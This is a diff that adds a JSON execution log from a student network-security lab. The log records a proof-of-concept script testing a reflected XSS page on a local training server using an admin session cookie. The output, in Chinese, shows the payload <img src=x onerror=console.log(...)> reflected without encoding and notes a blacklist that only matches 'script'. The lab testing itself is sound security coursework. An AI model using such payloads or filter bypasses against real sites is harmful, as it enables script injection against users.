@@ -1,0 +1,24 @@
+{
+  "cmd": [
+    "C:\\Users\\12396\\.dsh\\dsh-runtimes\\dsh-primary-runtime\\dependencies\\python\\python.exe",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-003__1.py",
+    "--url",
+    "http://127.0.0.1:9080/vulnerabilities/xss_r/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_high.cookie"
+  ],
+  "started_at": "2026-10-20T14:43:26+08:00",
+  "returncode": 0,
+  "elapsed_seconds": 0.375,
+  "stdout": "[基线] HTTP 200 | Hello 区域: 'LLM_LAB_BASELINE'\r\n[测试] URL=http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cimg+src%3Dx+onerror%3Dconsole.log%28%27LLM_LAB_XSS%27%29%3E\r\n[测试] HTTP 200 | 区域内容=\"<img src=x onerror=console.log('LLM_LAB_XSS')>\" | 原样包含载荷=True | 出现HTML实体编码=False\r\n[对照] HTTP 200 | Hello 区域: '>'\r\n[人工观察] 在浏览器打开上面的测试 URL，确认控制台输出 LLM_LAB_XSS 且页面显示破图；HTTP 响应本身不证明执行。\r\n[静态观察] 载荷在目标区域未被过滤或编码，与片段中仅匹配 script 字母序列的黑名单一致。\r\n",
+  "stderr": "",
+  "cohort": "v3",
+  "stem": "XSS-003__1",
+  "poc": "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\pocs\\v3\\XSS-003__1.py",
+  "args_redacted": [
+    "--url",
+    "http://127.0.0.1:9080/vulnerabilities/xss_r/",
+    "--cookie-file",
+    "C:\\Users\\12396\\Documents\\ChatGPT\\26271网络安全大作业\\optional1_delivery\\network-security-llm-lab-main\\optional1\\followup\\sessions\\admin_high.cookie"
+  ]
+}
